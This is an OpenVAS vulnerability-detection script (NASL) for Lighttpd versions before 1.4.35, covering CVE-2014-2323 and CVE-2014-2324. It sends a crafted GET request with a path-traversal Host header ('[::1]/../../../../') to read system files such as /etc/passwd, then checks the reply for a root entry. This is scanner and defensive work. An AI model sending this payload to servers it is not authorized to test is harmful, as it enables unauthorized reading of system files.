###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_lighttpd_mult_vuln.nasl 11867 2018-10-12 10:48:11Z cfischer $
#
# Lighttpd Multiple vulnerabilities
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:lighttpd:lighttpd";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802072");
  script_version("$Revision: 11867 $");
  script_cve_id("CVE-2014-2323", "CVE-2014-2324");
  script_bugtraq_id(66153, 66157);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-05-13 12:18:43 +0530 (Tue, 13 May 2014)");
  script_name("Lighttpd Multiple vulnerabilities");

  script_tag(name:"summary", value:"This host is running Lighttpd and is prone to multiple vulnerabilities");
  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check whether it responds with error
  message.");
  script_tag(name:"insight", value:"- mod_mysql_vhost module not properly sanitizing user supplied input passed
  via the hostname.

  - mod_evhost and mod_simple_vhost modules not properly sanitizing user supplied
  input via the hostname.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute arbitrary SQL
  commands and remote attackers to read arbitrary files via hostname.");
  script_tag(name:"affected", value:"Lighttpd version before 1.4.35");
  script_tag(name:"solution", value:"Upgrade to 1.4.35 or later.");

  script_xref(name:"URL", value:"http://seclists.org/oss-sec/2014/q1/561");
  script_xref(name:"URL", value:"http://download.lighttpd.net/lighttpd/security/lighttpd_sa_2014_01.txt");

  script_category(ACT_ATTACK);
  script_family("Web Servers");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("sw_lighttpd_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("lighttpd/installed");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"http://www.lighttpd.net/download");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! http_port = get_app_port( cpe:CPE ) ) exit( 0 );

## Send normal request
res = http_get_cache( item:"/", port:http_port );

## Exit if normal request is bad request to avoid FP
if( res =~ "HTTP/1.. 400 Bad Request" ) {
  exit( 0 );
}

files = traversal_files( "linux" );

foreach file( keys( files ) ) {

  ## Send crafted request
  crafted_req = 'GET /' + files[file] + ' HTTP/1.1' + '\r\n' +
                'Host: [::1]/../../../../../../../' + '\r\n\r\n';
  crafted_res = http_keepalive_send_recv( port:http_port, data:crafted_req, bodyonly:FALSE );

  ## Patched response
  if( crafted_res =~ 'HTTP/1.. 400 Bad Request' ) {
    continue;
  }

  ## Vulnerable lighttpd response
  if( crafted_res =~ 'root:.*:0:[01]:|HTTP/1.. 404 Not Found' ) {
    security_message( port:http_port );
    exit( 0 );
  }
}

exit( 99 );